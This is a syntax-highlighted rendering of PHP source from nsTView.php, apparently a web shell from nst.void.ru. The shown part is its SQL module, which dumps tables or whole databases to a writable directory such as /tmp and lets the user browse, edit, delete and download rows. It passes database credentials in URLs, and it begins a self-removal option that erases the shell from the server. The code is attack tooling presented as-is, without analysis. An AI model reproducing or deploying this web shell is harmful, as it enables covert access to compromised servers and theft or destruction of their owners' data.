<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">red</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Change</span> <span class="nx">variable</span> <span class="o">&amp;</span><span class="nx">f_d</span><span class="o">=</span><span class="p">(</span><span class="nx">here</span> <span class="nx">writable</span> <span class="nx">directory</span><span class="p">,</span> <span class="nx">expl</span><span class="o">:</span> <span class="o">/</span><span class="nx">tmp</span> <span class="k">or</span> <span class="nx">c</span><span class="o">:/</span><span class="nx">windows</span><span class="o">/</span><span class="nx">temp</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">font</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="nx">Then</span> <span class="nx">press</span> <span class="nx">enter</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">font</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">font</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;);}</span>
<span class="s2">mysql_select_db(</span><span class="si">$db</span><span class="s2">) or die(&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">red</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;.mysql_error().&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">font</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;);</span>
<span class="si">$fp</span><span class="s2"> = fopen(</span><span class="si">$f_d</span><span class="s2">.&quot;</span><span class="o">/</span><span class="s2">&quot;.</span><span class="si">$f</span><span class="s2">,&quot;</span><span class="nx">w</span><span class="s2">&quot;);</span>
<span class="s2">fwrite(</span><span class="si">$fp</span><span class="s2">, &quot;</span><span class="c1"># nsTView.php v$ver</span>
<span class="c1"># Web: http://nst.void.ru</span>
<span class="c1"># Dump from: &quot;.$_SERVER[&quot;SERVER_NAME&quot;].&quot; (&quot;.$_SERVER[&quot;SERVER_ADDR&quot;].&quot;)</span>
<span class="c1"># MySQL version: &quot;.mysql_get_server_info().&quot;</span>
<span class="c1"># PHP version: &quot;.phpversion().&quot;</span>
<span class="c1"># Date: &quot;.date(&quot;d.m.Y - H:i:s&quot;).&quot;</span>
<span class="c1"># Dump db ( $db ) Table ( $tbl )</span>
<span class="c1"># --- eof ---</span>

<span class="s2">&quot;);</span>
<span class="si">$que</span><span class="s2"> = mysql_query(&quot;</span><span class="nx">SHOW</span> <span class="nx">CREATE</span> <span class="nx">TABLE</span> <span class="sb">`$tbl`</span><span class="s2">&quot;) or die(&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">red</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;.mysql_error().&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">font</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;);</span>
<span class="si">$row</span><span class="s2"> = mysql_fetch_row(</span><span class="si">$que</span><span class="s2">);</span>
<span class="s2">fwrite(</span><span class="si">$fp</span><span class="s2">, &quot;</span><span class="nx">DROP</span> <span class="nx">TABLE</span> <span class="k">IF</span> <span class="nx">EXISTS</span> <span class="sb">`$tbl`</span><span class="p">;</span><span class="nx">\r\n</span><span class="s2">&quot;);</span>
<span class="si">$row[1]</span><span class="s2">=str_replace(&quot;</span><span class="nx">\n</span><span class="s2">&quot;,&quot;</span><span class="nx">\r\n</span><span class="s2">&quot;,</span><span class="si">$row[1]</span><span class="s2">);</span>
<span class="s2">fwrite(</span><span class="si">$fp</span><span class="s2">, </span><span class="si">$row[1]</span><span class="s2">.&quot;</span><span class="p">;</span><span class="nx">\r\n\r\n</span><span class="s2">&quot;);</span>
<span class="si">$que</span><span class="s2"> = mysql_query(&quot;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="sb">`$tbl`</span><span class="s2">&quot;);</span>
<span class="s2">if(mysql_num_rows(</span><span class="si">$que</span><span class="s2">)&amp;gt;0){</span>
<span class="s2">while(</span><span class="si">$row</span><span class="s2"> = mysql_fetch_assoc(</span><span class="si">$que</span><span class="s2">)){</span>
<span class="si">$keys</span><span class="s2"> = join(&quot;</span><span class="sb">`, `</span><span class="s2">&quot;, array_keys(</span><span class="si">$row</span><span class="s2">));</span>
<span class="si">$values</span><span class="s2"> = array_values(</span><span class="si">$row</span><span class="s2">);</span>
<span class="s2">foreach(</span><span class="si">$values</span><span class="s2"> as </span><span class="si">$k</span><span class="s2">=&amp;gt;</span><span class="si">$v</span><span class="s2">) </span><span class="si">{</span><span class="nv">$values</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nx">adds2</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span><span class="si">}</span><span class="s2"></span>
<span class="si">$values</span><span class="s2"> = implode(&quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot;, </span><span class="si">$values</span><span class="s2">);</span>
<span class="si">$sql</span><span class="s2"> = &quot;</span><span class="nx">INSERT</span> <span class="nx">INTO</span> <span class="sb">`$tbl`</span><span class="p">(</span><span class="sb">`$keys`</span><span class="p">)</span> <span class="nx">VALUES</span> <span class="p">(</span><span class="s1">&#39;&quot;.$values.&quot;&#39;</span><span class="p">);</span><span class="nx">\r\n</span><span class="s2">&quot;;</span>
<span class="s2">fwrite(</span><span class="si">$fp</span><span class="s2">, </span><span class="si">$sql</span><span class="s2">);</span>
<span class="s2">}</span>
<span class="s2">}</span>
<span class="s2">fclose(</span><span class="si">$fp</span><span class="s2">);</span>
<span class="s2">print &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">meta</span> <span class="nx">http</span><span class="o">-</span><span class="nx">equiv</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">0;URL=</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;baza=1&amp;dump_download=1&amp;f_d=</span><span class="si">$f_d</span><span class="s2">/</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span><span class="c1">#end of dump</span>




<span class="c1"># db dump</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;dump_db&#39;</span><span class="p">]){</span>
<span class="nv">$c</span><span class="o">=</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nb">mysql_list_tables</span><span class="p">(</span><span class="nv">$db</span><span class="p">));</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$c</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span><span class="mi">1</span><span class="p">){</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;Dump database &amp;lt;b&amp;gt;</span><span class="si">$db</span><span class="s2">&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;font color=red&amp;gt;Cannot dump database. No tables exists in &amp;lt;b&amp;gt;</span><span class="si">$db</span><span class="s2">&amp;lt;/b&amp;gt; db.&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">die</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">if</span><span class="p">(</span><span class="nb">sizeof</span><span class="p">(</span><span class="nv">$tabs</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
<span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW TABLES FROM </span><span class="si">$db</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">0</span><span class="p">){</span>
<span class="k">while</span><span class="p">(</span><span class="nv">$row</span><span class="o">=</span><span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$res</span><span class="p">)){</span>
<span class="nv">$tabs</span><span class="p">[]</span> <span class="o">.=</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$f_d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$f</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="s2">&quot;# nsTView.php v</span><span class="si">$ver</span><span class="s2"></span>
<span class="s2"># Web: http://nst.void.ru</span>
<span class="s2"># Dump from: &quot;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;SERVER_NAME&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; (&quot;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;SERVER_ADDR&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;)</span>
<span class="s2"># MySQL version: &quot;</span><span class="o">.</span><span class="nb">mysql_get_server_info</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="s2"># PHP version: &quot;</span><span class="o">.</span><span class="nb">phpversion</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="s2"># Date: &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d.m.Y - H:i:s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="s2"># Dump db ( </span><span class="si">$db</span><span class="s2"> )</span>
<span class="s2"># --- eof ---</span>

<span class="s2">&quot;</span><span class="p">);</span>
<span class="k">foreach</span><span class="p">(</span><span class="nv">$tabs</span> <span class="k">as</span> <span class="nv">$tab</span><span class="p">)</span> <span class="p">{</span>
<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s2">&quot;DROP TABLE IF EXISTS `</span><span class="si">$tab</span><span class="s2">`;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW CREATE TABLE `</span><span class="si">$tab</span><span class="s2">`&quot;</span><span class="p">);</span>
<span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
<span class="nv">$row</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$row</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;;</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM `</span><span class="si">$tab</span><span class="s2">`&quot;</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">0</span><span class="p">){</span>
<span class="k">while</span><span class="p">(</span><span class="nv">$row</span><span class="o">=</span><span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$res</span><span class="p">)){</span>
<span class="nv">$keys</span> <span class="o">=</span> <span class="nb">join</span><span class="p">(</span><span class="s2">&quot;`, `&quot;</span><span class="p">,</span> <span class="nb">array_keys</span><span class="p">(</span><span class="nv">$row</span><span class="p">));</span>
<span class="nv">$values</span> <span class="o">=</span> <span class="nb">array_values</span><span class="p">(</span><span class="nv">$row</span><span class="p">);</span>
<span class="k">foreach</span><span class="p">(</span><span class="nv">$values</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$values</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nx">adds2</span><span class="p">(</span><span class="nv">$v</span><span class="p">);}</span>
<span class="nv">$values</span> <span class="o">=</span> <span class="nb">join</span><span class="p">(</span><span class="s2">&quot;&#39;, &#39;&quot;</span><span class="p">,</span> <span class="nv">$values</span><span class="p">);</span>
<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;INSERT INTO `</span><span class="si">$tab</span><span class="s2">`(`</span><span class="si">$keys</span><span class="s2">`) VALUES (&#39;</span><span class="si">$values</span><span class="s2">&#39;);</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
<span class="p">}}</span>
<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\r\n\r\n\r\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;meta http-equiv=</span><span class="se">\&quot;</span><span class="s2">REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">0;URL=</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;baza=1&amp;dump_download=1&amp;f_d=</span><span class="si">$f_d</span><span class="s2">/</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span><span class="c1">#end of db dump</span>






<span class="nv">$vnutr</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;vnutr&#39;</span><span class="p">];</span>
<span class="nv">$tbl</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;tbl&#39;</span><span class="p">];</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$vnutr</span> <span class="k">and</span> <span class="o">!</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ins_new_line&#39;</span><span class="p">]){</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;table cellpadding=0 cellspacing=1&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="p">;</span>

<span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$db</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
<span class="nv">$c</span><span class="o">=</span><span class="nb">mysql_query</span> <span class="p">(</span><span class="s2">&quot;SELECT COUNT(*) FROM </span><span class="si">$tbl</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="nv">$cfa</span><span class="o">=</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
<span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
<span class="k">print</span> <span class="s2">&quot;</span>
<span class="s2">Total: </span><span class="si">$cfa[0]</span><span class="s2"></span>
<span class="s2">&amp;lt;form&amp;gt;</span>
<span class="s2">From: &amp;lt;input name=from size=3 value=0&amp;gt;</span>
<span class="s2">To: &amp;lt;input name=to size=3 value=&#39;</span><span class="si">$cfa[0]</span><span class="s2">&#39;&amp;gt;</span>
<span class="s2">&amp;lt;input type=submit name=show value=Show&amp;gt;</span>
<span class="s2">&amp;lt;input type=hidden name=vnutr value=1&amp;gt;</span>
<span class="s2">&amp;lt;input type=hidden name=vn value=&#39;</span><span class="si">$vn</span><span class="s2">&#39;&amp;gt;</span>
<span class="s2">&amp;lt;input type=hidden name=db value=&#39;</span><span class="si">$db</span><span class="s2">&#39;&amp;gt;</span>
<span class="s2">&amp;lt;input type=hidden name=login value=&#39;</span><span class="si">$login</span><span class="s2">&#39;&amp;gt;</span>
<span class="s2">&amp;lt;input type=hidden name=pass value=&#39;</span><span class="si">$pass</span><span class="s2">&#39;&amp;gt;</span>
<span class="s2">&amp;lt;input type=hidden name=adress value=&#39;</span><span class="si">$adress</span><span class="s2">&#39;&amp;gt;</span>
<span class="s2">&amp;lt;input type=hidden name=conn value=1&amp;gt;</span>
<span class="s2">&amp;lt;input type=hidden name=baza value=1&amp;gt;</span>
<span class="s2">&amp;lt;input type=hidden name=p value=sql&amp;gt;</span>
<span class="s2">&amp;lt;input type=hidden name=tbl value=&#39;</span><span class="si">$tbl</span><span class="s2">&#39;&amp;gt;</span>
<span class="s2"> [&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?getdb=1&amp;to=</span><span class="si">$cfa[0]</span><span class="s2">&amp;vnutr=1&amp;vn=</span><span class="si">$vn</span><span class="s2">&amp;db=</span><span class="si">$db</span><span class="s2">&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;baza=1&amp;p=sql&amp;tbl=</span><span class="si">$tbl</span><span class="s2">&#39;&amp;gt;DOWNLOAD&amp;lt;/a&amp;gt;] [&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?to=</span><span class="si">$cfa[0]</span><span class="s2">&amp;vnutr=1&amp;vn=</span><span class="si">$vn</span><span class="s2">&amp;db=</span><span class="si">$db</span><span class="s2">&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;baza=1&amp;p=sql&amp;tbl=</span><span class="si">$tbl</span><span class="s2">&amp;ins_new_line=1&#39;&amp;gt;INSERT&amp;lt;/a&amp;gt;] [&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?to=</span><span class="si">$cfa[0]</span><span class="s2">&amp;vnutr=1&amp;vn=</span><span class="si">$vn</span><span class="s2">&amp;db=</span><span class="si">$db</span><span class="s2">&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;baza=1&amp;p=sql&amp;tbl=</span><span class="si">$tbl</span><span class="s2">&amp;dump=1&amp;f_d=</span><span class="si">$d</span><span class="s2">&#39;&amp;gt;DUMP&amp;lt;/a&amp;gt;]</span>
<span class="s2">&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;</span>
<span class="nv">$vn</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;vn&#39;</span><span class="p">];</span>
<span class="nv">$from</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;from&#39;</span><span class="p">];</span>
<span class="nv">$to</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;to&#39;</span><span class="p">];</span>
<span class="nv">$from</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;from&#39;</span><span class="p">];</span>
<span class="nv">$to</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;to&#39;</span><span class="p">];</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$from</span><span class="p">)){</span><span class="nv">$from</span><span class="o">=</span><span class="mi">0</span><span class="p">;}</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$to</span><span class="p">)){</span><span class="nv">$to</span><span class="o">=</span><span class="mi">50</span><span class="p">;}</span>
<span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM </span><span class="si">$vn</span><span class="s2"> LIMIT </span><span class="si">$from</span><span class="s2">,</span><span class="si">$to</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
<span class="nv">$result1</span><span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
<span class="k">print</span> <span class="nv">$del_result</span><span class="p">;</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;table cellpadding=0 cellspacing=1 border=1&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">mysql_num_fields</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
<span class="nv">$name</span><span class="o">=</span><span class="nb">mysql_field_name</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span><span class="nv">$i</span><span class="p">);</span>
<span class="nv">$type</span>  <span class="o">=</span> <span class="nb">mysql_field_type</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span>
<span class="nv">$len</span>  <span class="o">=</span> <span class="nb">mysql_field_len</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;td bgcolor=#BCE0FF&amp;gt; </span><span class="si">$name</span><span class="s2"> (&amp;lt;b&amp;gt;</span><span class="si">$type</span><span class="s2">(</span><span class="si">$len</span><span class="s2">)&amp;lt;/b&amp;gt;)&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;/tr&amp;gt;&amp;lt;pre&amp;gt;&quot;</span><span class="p">;</span>

<span class="k">while</span><span class="p">(</span><span class="nv">$mn</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_ASSOC</span><span class="p">)){</span>
<span class="k">foreach</span><span class="p">(</span><span class="nv">$mn</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$inside</span><span class="p">){</span>
<span class="nv">$buffer1</span> <span class="o">.=</span> <span class="s2">&quot;`</span><span class="si">$key</span><span class="s2">`=&#39;&quot;</span><span class="o">.</span><span class="nx">adds</span><span class="p">(</span><span class="nv">$inside</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39; AND &quot;</span><span class="p">;</span>
<span class="nv">$b1</span> <span class="o">.=</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$inside</span><span class="p">,</span> <span class="nx">ENT_NOQUOTES</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;nbsp;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="nv">$buffer1</span>  <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$buffer1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$buffer1</span><span class="p">)</span><span class="o">-</span><span class="mi">5</span><span class="p">);</span>
<span class="nv">$buffer1</span>  <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$buffer1</span><span class="p">);</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;td&amp;gt;</span>
<span class="s2">&amp;lt;form method=post action=&#39;</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;tbl=</span><span class="si">$tbl</span><span class="s2">&amp;vnutr=1&amp;baza=1&amp;vn=</span><span class="si">$vn</span><span class="s2">&amp;db=</span><span class="si">$db</span><span class="s2">&#39;&amp;gt;</span>
<span class="s2">&amp;lt;input type=hidden name=delete_row value=&#39;</span><span class="si">$buffer1</span><span class="s2">&#39;&amp;gt;</span>
<span class="s2">&amp;lt;input type=submit value=Del onclick=&#39;return confirm(</span><span class="se">\&quot;</span><span class="s2">DELETE ?</span><span class="se">\&quot;</span><span class="s2">)&#39; style=&#39;border:1px; background-color:white;&#39;&amp;gt;</span>
<span class="s2">&amp;lt;/form&amp;gt;&amp;lt;form method=post action=&#39;</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;tbl=</span><span class="si">$tbl</span><span class="s2">&amp;baza=1&amp;vn=</span><span class="si">$vn</span><span class="s2">&amp;db=</span><span class="si">$db</span><span class="s2">&#39;&amp;gt;</span>
<span class="s2">&amp;lt;input type=hidden name=edit_row value=&#39;</span><span class="si">$buffer1</span><span class="s2">&#39;&amp;gt;</span>
<span class="s2">&amp;lt;input type=submit value=Edit style=&#39;border:1px;background-color:green;&#39;&amp;gt;</span>
<span class="s2">&amp;lt;/form&amp;gt;</span>
<span class="s2">&amp;lt;/td&amp;gt;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="k">print</span> <span class="nv">$b1</span><span class="p">;</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
<span class="nb">unset</span><span class="p">(</span><span class="nv">$b1</span><span class="p">);</span>
<span class="nb">unset</span><span class="p">(</span><span class="nv">$buffer1</span><span class="p">);</span>
<span class="p">}</span>



<span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span> <span class="c1">#end vnutr</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span> <span class="c1"># end $conn</span>



<span class="c1">####   end of sql</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;/tr&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/table&amp;gt; &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">print</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="k">die</span><span class="p">;</span>
<span class="p">}</span>


<span class="o">@</span><span class="nv">$p</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">];</span>
<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;selfremover&quot;</span><span class="p">){</span>
        <span class="k">print</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;font color=red face=verdana size=1&amp;gt;Are you sure?&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?p=yes&#39;&amp;gt;Yes&amp;lt;/a&amp;gt; | &amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?&#39;&amp;gt;No&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;</span>
